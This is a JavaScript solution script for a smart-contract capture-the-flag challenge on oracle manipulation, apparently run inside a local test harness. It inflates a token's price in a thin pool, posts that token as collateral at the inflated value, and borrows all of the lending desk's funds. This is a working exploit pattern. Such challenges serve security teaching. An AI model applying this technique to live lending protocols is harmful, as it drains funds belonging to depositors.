const { ethers } = require("ethers");
const { challengeSuite } = require("./harness");
const { at } = require("../lib/artifacts");
const mod = require("../lib/challenges/08-oracle-manipulation");

challengeSuite(mod, async ({ signers }, s) => {
  const p = signers.player;
  const dvt = at("DVToken", s.dvt, p);
  const dusd = at("DVToken", s.dusd, p);
  const pool = at("SimplePool", s.pool, p);
  const desk = at(s.contract, s.desk, p);

  // 1) Buy DVT with all our dUSD -> DVT spot price in the thin pool explodes.
  await (await dusd.approve(s.pool, ethers.MaxUint256)).wait();
  await (await pool.swap(s.dusd, ethers.parseEther("1000"))).wait();
  // 2) Post all DVT as collateral, valued at the manipulated price.
  const bal = await dvt.balanceOf(p.address);
  await (await dvt.approve(s.desk, bal)).wait();
  await (await desk.depositCollateral(bal)).wait();
  // 3) Borrow everything the desk has.
  await (await desk.borrow(await dusd.balanceOf(s.desk))).wait();
});
